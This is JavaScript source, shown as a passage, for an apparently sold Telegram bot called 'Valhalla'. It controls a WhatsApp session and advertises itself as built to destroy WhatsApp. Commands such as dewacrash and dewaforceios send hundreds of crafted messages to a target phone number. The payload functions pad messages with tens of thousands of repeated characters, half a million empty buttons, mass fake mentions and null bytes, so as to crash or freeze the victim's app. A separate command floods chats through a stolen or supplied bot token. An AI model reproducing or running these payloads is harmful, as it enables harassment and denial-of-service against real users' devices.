☩ Developer : 𝐃𝐞𝐰𝐚4𝐏𝐚𝐫𝐭𝐧𝐞𝐫𝐬𝐈𝐧𝐂𝐫𝐢𝐦𝐞
☩ Telegram : t.me/ciaaaange
☩ YouTube : @fnz4you
☩ Prefix : multi
☩ Type : /
☩ Language : JavaScript
☩ Memory : ${memoryStatus}
☩ Sender : ${senderStatus}
☩ RunTime : ${runtimeStatus}

╭═───⊱ TOOLS MENU ───═⬡
│ ⸙ /checkgroupid
│ᯓ➤ Check Whatsapp Group Id
│⸙ /ttvideo
│ᯓ➤ Tiktok Downloder
│⸙ /rasukbot
│ᯓ➤ Rasuk Bot
╰═─────────────═⬡</blockquote>
`;

  const keyboard = [[{ text: "⌜🔙⌟ ☇ メインコース", callback_data: "/start" }]];

  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageCaption(toolsMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    } else {
      await ctx.replyWithPhoto(thumbnailUrl, { caption: toolsMenu, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    }
  } catch (error) {
    console.error("Tools menu error:", error);
    await ctx.answerCbQuery().catch(() => {});
  }
}

// ───────────────────────────────────────────────────────────
// PERINTAH MANUAL (BISA DIKETIK)
// ───────────────────────────────────────────────────────────
bot.command('controls', showControlsMenu);
bot.command('bug', showBugMenu);
bot.command('bug2', showBug2Menu);
bot.command('tqto', showTqtoMenu);
bot.command('tools', showToolsMenu);

// ───────────────────────────────────────────────────────────
// TOMBOL CALLBACK (TETAP BISA DITEK)
// ───────────────────────────────────────────────────────────
bot.on("callback_query", async (ctx) => {
  const query = ctx.callbackQuery;
  if (!query.message) return;

  const chatId = query.message.chat.id;
  const userId = query.from.id;
  const messageId = query.message.message_id;
  const data = query.data;

  if (buttonIntervals.has(messageId)) {
    clearInterval(buttonIntervals.get(messageId));
    buttonIntervals.delete(messageId);
  }

  if (data.startsWith("color_")) {
    const color = data.replace("color_", "");
    userButtonColor[userId] = color;
    await ctx.answerCbQuery("🎨 Warna berhasil dipilih!");
    await ctx.deleteMessage().catch(() => {});
    await sendStartMenu(chatId, ctx.from);
    return;
  }

  if (data === "/start") {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const displayName = escapeHtml(ctx.from.first_name || ctx.from.username || "User");
  
    const menuMessage = `
<blockquote>( 👋 ) — Здравствуйте ${displayName}
( 🍁 ) — я скриптовый бот WhatsApp, созданный Dewa4You, предназначенный для разрушения системы WhatsApp.

➤ 〔 INFORMATION 〕
☩ Nama Bot : Valhalla 
☩ Version : 7.0.0 Buy Only
☩ Developer : 𝐃𝐞𝐰𝐚4𝐏𝐚𝐫𝐭𝐧𝐞𝐫𝐬𝐈𝐧𝐂𝐫𝐢𝐦𝐞
☩ Telegram : t.me/ciaaaange
☩ YouTube : @fnz4you
☩ Prefix : multi
☩ Type : /
☩ Language : JavaScript
☩ Memory : ${memoryStatus}
☩ Sender : ${senderStatus}
☩ RunTime : ${runtimeStatus}</blockquote>`;

    const keyboard = [
      [
        { text: "𝐂𝐎𝐍𝐓𝐑𝐎𝐋𝐒", callback_data: "/controls" },
        { text: "𝐁𝐔𝐆𝐌𝐄𝐍𝐔", callback_data: "/bug" }
      ],
      [
        { text: "𝐓𝐇𝐄 𝐃𝐄𝐕𝐀𝐒", url: "https://t.me/ciaaaange" }
      ],
      [
        { text: "𝐓𝐇𝐀𝐍𝐊𝐒", callback_data: "/tqto" },
        { text: "𝐓𝐎𝐎𝐋𝐒", callback_data: "/tools" }
      ],
      [
        { text: "𝐂𝐇𝐀𝐍𝐄𝐒", url: "https://t.me/fnz4you" }
      ]
    ];

    try {
      await ctx.editMessageMedia({
        type: 'photo',
        media: thumbnailUrl,
        caption: menuMessage,
        parse_mode: "HTML",
      }, { reply_markup: { inline_keyboard: keyboard } });
    } catch (error) {
      console.error("Edit error:", error);
      await ctx.answerCbQuery();
    }
    return;
  }

  if (data === "/controls") return showControlsMenu(ctx);
  if (data === "/bug") return showBugMenu(ctx);
  if (data === "/bug2") return showBug2Menu(ctx);
  if (data === "/tqto") return showTqtoMenu(ctx);
  if (data === "/tools") return showToolsMenu(ctx);

  await ctx.answerCbQuery("❌ Tombol tidak dikenali!");
});

// ───────────────────────────────────────────────────────────
// FUNGSI BUG2 MENU
// ───────────────────────────────────────────────────────────
async function showBug2Menu(ctx) {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();
  const displayName = escapeHtml(ctx.from.first_name || ctx.from.username || "User");
  
  const bugMenu2 = `
<blockquote>( 👋 ) — Здравствуйте ${displayName}
( 🍁 ) — я скриптовый бот WhatsApp, созданный Dewa4You, предназначенный для разрушения системы WhatsApp.

➤ 〔 INFORMATION 〕
☩ Nama Bot : Valhalla 
☩ Version : 7.0.0 Buy Only
☩ Developer : 𝐃𝐞𝐰𝐚4𝐏𝐚𝐫𝐭𝐧𝐞𝐫𝐬𝐈𝐧𝐂𝐫𝐢𝐦𝐞
☩ Telegram : t.me/ciaaaange
☩ YouTube : @fnz4you
☩ Prefix : multi
☩ Type : /
☩ Language : JavaScript
☩ Memory : ${memoryStatus}
☩ Sender : ${senderStatus}
☩ RunTime : ${runtimeStatus}

〔 Bug Menu 2 〕
╰┈➤⊘ /dewaspam ✆ 62xx
 ᝰ.ᐟ. Delay Bebas Sepam
╰┈➤⊘ /dewaforceios ✆ 62xx
 ᝰ.ᐟ. Forclose Bebas Spam</blockquote>`;

  const keyboard = [
    [{ text: "⌜🔙⌟ ☇ メインコース", callback_data: "/start" }]
  ];

  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageCaption(bugMenu2, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    } else {
      await ctx.replyWithPhoto(thumbnailUrl, { caption: bugMenu2, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    }
  } catch (error) {
    console.error("Bug2 menu error:", error);
    await ctx.answerCbQuery().catch(() => {});
  }
}

//

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Number
│ᯓ➤ ${phoneNumber}
│ ⸙ Pairing
│ᯓ➤ ${formattedCode}
│ ⸙ Status
│ᯓ➤ Not Connected
╰═─────────────═⬡</strong></blockquote>
`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

bot.command('rasukbot', async (ctx) => {
  const input = ctx.message.text.split(' ').slice(1).join(' ');

  if (!input.includes("|")) {
    return ctx.replyWithPhoto(
      'https://files.catbox.moe/8vas4l.jpg',
      {
        caption: "📩 Format salah!\n\nGunakan format:\n" +
                "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
                "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
        parse_mode: "HTML"
      }
    );
  }

  try {
    const [token, targetId, pesan, jumlahStr] = input.split("|").map(x => x.trim());
    const jumlah = parseInt(jumlahStr);

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.replyWithPhoto(
        'https://files.catbox.moe/8vas4l.jpg',
        {
          caption: "❌ Format salah!\nGunakan: <code>/rasukbot token|id|pesan|jumlah</code>",
          parse_mode: "HTML"
        }
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.replyWithPhoto(
      'https://files.catbox.moe/8vas4l.jpg',
      {
        caption: `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`,
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    await ctx.replyWithPhoto(
      'https://files.catbox.moe/346js8.jpg',
      {
        caption: `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`,
        parse_mode: "HTML"
      }
    );
  }
});

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('ttvideo', async (ctx) => {
    try {
        const args = ctx.message.text.split(' ').slice(1);
        if (args.length === 0) {
            return ctx.reply("❌ Format: /ttvideo <url_tiktok>");
        }

        const tiktokUrl = args[0];
        
        if (!tiktokUrl.includes('tiktok.com') && !tiktokUrl.includes('vt.tiktok.com')) {
            return ctx.reply("❌ URL TikTok tidak valid!");
        }

        const processingMsg = await ctx.reply("⏳ Sedang diproses...");

        const apiUrl = `https://tikwm.com/api?url=${encodeURIComponent(tiktokUrl)}`;
        const response = await axios.get(apiUrl, { timeout: 30000 });
        const data = response.data;

        if (data.code === 0 && data.data && data.data.play) {
            await ctx.deleteMessage(processingMsg.message_id);
            
            await ctx.replyWithVideo(data.data.play, {
                caption: `🎬 TikTok • ${data.data.author?.nickname || 'Unknown'}`
            });
            
        } else {
            await ctx.deleteMessage(processingMsg.message_id);
            ctx.reply("❌ Gagal mendownload video!");
        }
        
    } catch (error) {
        console.error('Error:', error.message);
        
        try {
            if (processingMsg) {
                await ctx.deleteMessage(processingMsg.message_id);
            }
        } catch (e) {}
        
        ctx.reply("❌ Error: " + error.message);
    }
});

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }
    
    const userId = args[1];
    addAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});

bot.command('addpremium', checkAdmin, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', checkAdmin, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

//

bot.command("checkgroupid", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  try {
    const text = ctx.message.text;
    const link = text.split(" ")[1];

    if (!link)
      return ctx.reply("🪧 ☇ Format: /checkgroupid https://chat.whatsapp.com/xxxxx");

    const match = link.match(
      /chat\.whatsapp\.com\/([A-Za-z0-9_-]{10,})/
    );

    if (!match)
      return ctx.reply("❌ ☇ Link grup tidak valid");

    const inviteCode = match[1];

    if (!sock)
      return ctx.reply("❌ ☇ Socket belum siap");

    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupId = info.id;
    const subject = info.subject || "-";
    const owner = info.owner || "-";
    const size = info.size || 0;

    await ctx.reply(`
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Name
│ᯓ➤ ${subject}
│ ⸙ Group ID
│ᯓ➤ ${groupId}
│ ⸙ Owner
│ᯓ➤ ${owner}
│ ⸙ Members
│ᯓ➤ ${size}
╰═─────────────═⬡</strong></blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    ctx.reply("❌ ☇ Gagal mengambil Id grup");
  }
});

//

bot.command("dewainvis", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /nebulacrash 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Invisible Hard 
│ ⸙ Potential Ban
│ᯓ➤ 60.0% ( High )
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
      await ForceloseSendPayment(sock, target);
      await sleep(100);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Invisible Hard
│ ⸙ Potential Ban
│ᯓ➤ 60.0% ( High )
│ ⸙ Status
│ᯓ➤ Success
╰═─────────────═⬡</strong></blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });
});

bot.command("dewaspam", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /gloryforce 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Delay Spam
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 900; i++) {
      await DelayPerma(sock, target);
      await InterSql(sock, target);
      await X5Delay(target);
      await GlxButton(target);
      await sleep(100);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Delay Spam
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Success
╰═─────────────═⬡</strong></blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });
});

bot.command("dewablank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /magicforce 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Blank Notif
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 900; i++) {
      await DelayPerma(sock, target);
      await InterSql(sock, target);
      await X5Delay(target);
      await GlxButton(target);
      await sleep(100);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Blank Notif
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Success
╰═─────────────═⬡</strong></blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });
});

bot.command("dewabuldo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /magicforce 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Buldozer Delay
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 900; i++) {
      await DelayPerma(sock, target);
      await InterSql(sock, target);
      await X5Delay(target);
      await GlxButton(target);
      await sleep(100);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Buldozer Delay 
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Success
╰═─────────────═⬡</strong></blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });
});

bot.command("dewadelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /magicforce 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Delayhard 
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 900; i++) {
      await DelayPerma(sock, target);
      await InterSql(sock, target);
      await X5Delay(target);
      await GlxButton(target);
      await sleep(100);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Delayhard 
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Success
╰═─────────────═⬡</strong></blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });
});

bot.command("dewacrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /magicforce 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Crash Home 
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 900; i++) {
      await DelayPerma(sock, target);
      await InterSql(sock, target);
      await X5Delay(target);
      await GlxButton(target);
      await sleep(100);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Crash Home 
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Success
╰═─────────────═⬡</strong></blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });
});

bot.command("dewaforceios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /magicforce 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Forclose iPhone 
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Process
╰═─────────────═⬡</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 900; i++) {
      await DelayPerma(sock, target);
      await InterSql(sock, target);
      await X5Delay(target);
      await GlxButton(target);
      await sleep(100);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Target
│ᯓ➤ ${number}
│ ⸙ Type
│ᯓ➤ Forclose iPhone 
│ ⸙ Potential Ban
│ᯓ➤ 20.0% ( Low )
│ ⸙ Status
│ᯓ➤ Success
╰═─────────────═⬡</strong></blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${number}` }
      ]]
    }
  });
});

//
async function Notifcrash(sock, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Cupof joe" + "ꦽ".repeat(20000),
        url: "https://github.com/zephyrinee/" + "ꦽ".repeat(20000),
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "ꦽ".repeat(20000),
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: "Cupof joe" + "ꦽ".repeat(20000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.sendMessage(target, msg.message, {
    messageId: msg.key?.id,
    quoted: null
  });
}

async function DelayPerma(sock, target) {
  const msg = {
    storageMessage: {
      fileSize: 99999999999999999,
      writeDelay: 3000000,  
      readDelay: 3000000,   
      cacheDelay: 3000000,  
      contextInfo: {
        participant: target,
        quotedMessage: {
          storageMessage: {
            writeDelay: 25000000,
            contextInfo: {
              quotedMessage: {
                storageMessage: {
                  readDelay: 2000000,
                  contextInfo: {
                    quotedMessage: {
                      storageMessage: {
                        cacheDelay: 15000000
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, {
        participant: { jid: target }
    });
}
async function InterSql(sock, target) {
const psn = {
interactiveMessage: {
body: {
text: "Nted - Executions"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}

await sock.relayMessage(target, {
groupStatusMessageV2: {
message: psn
}
}, {
participant: { jid: target }
})
}
async function ForceloseSendPayment(sock, target) {
try { 
const DewaPay = {
sendPaymentMessage: {
currencyCodeIso4217: 'IDR',
requestFrom: target,
expiryTimestamp: null,
amount: 1,
recipient: '0@whatsapp.net',
contextInfo: {
externalAdReply: {
title: "t.me/ciaaaange",
body: "ြ".repeat(50000),
mimetype: 'audio/mpeg',
caption: "ြ".repeat(50000),
showAdAttribution: true,
sourceUrl: 'https://t.me/dewareall',
thumbnailUrl: 'https://files.catbox.moe/181827.jpg'
}
}
}
};

await sock.relayMessage(target, DewaPay, {
participant: { jid: target },
messageId: null,
userJid: target,
quoted: null
});

console.log(`Send Forclose To ${target}`);
} catch (error) {
console.error('Error:', error.message);
throw error;
} 
}
async function X5Delay(target) {
const X7Fvck = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "\u0000".repeat(200),
format: "DEFAULT"
},
nativeFlowResponseMessage: {
name: "address_message",
paramsJson: '{"values":{"in_pin_code":"999999","building_name":"","landmark_area":"18","address":"Amp4","tower_number":"","city":"","name":"Amp4","phone_number":"999999999999","house_number":"13135550002","floor_number":"@3135550202","state":"X' + "\u0000".repeat(900000) + '"}}',
version: 3
}
},
contextInfo: {
mentionedJid: Array.from(
{ length: 300000 },
() => Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
),
remoteJid: "status@broadcast",
forwardingScore: 999,
isForwarded: true
}
}
}
}, {});
    
await sock.relayMessage("status@broadcast", X7Fvck.message, {
messageId: X7Fvck.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: { jid: target }
}]
